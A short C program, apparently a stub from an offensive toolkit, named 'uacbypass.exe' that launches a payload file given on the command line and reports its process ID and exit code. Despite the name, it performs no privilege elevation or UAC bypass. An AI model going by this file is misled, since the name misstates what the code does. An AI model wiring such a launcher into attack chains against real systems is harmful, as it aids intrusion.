/*
 * Minimal uacbypass.exe - Just executes the payload
 * Compiles cleanly with mingw-w64 as console application
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

/* Use WinMain for GUI application, but we'll use main for console */
int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload_path>\n", argv[0]);
        return 1;
    }

    // Convert to wide string for Windows API
    int wlen = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
    LPWSTR payloadPath = (LPWSTR)malloc(wlen * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, payloadPath, wlen);

    if (!PathFileExistsW(payloadPath)) {
        printf("[-] Payload not found: %s\n", argv[1]);
        free(payloadPath);
        return 1;
    }

    printf("[+] uacbypass.exe executing payload: %s\n", argv[1]);

    // Execute the payload
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessW(payloadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to execute payload: %lu\n", GetLastError());
        free(payloadPath);
        return 1;
    }

    printf("[+] Payload executed successfully (PID: %lu)\n", pi.dwProcessId);

    // Wait for payload to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[+] Payload exited with code: %lu\n", exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(payloadPath);

    return 0;
}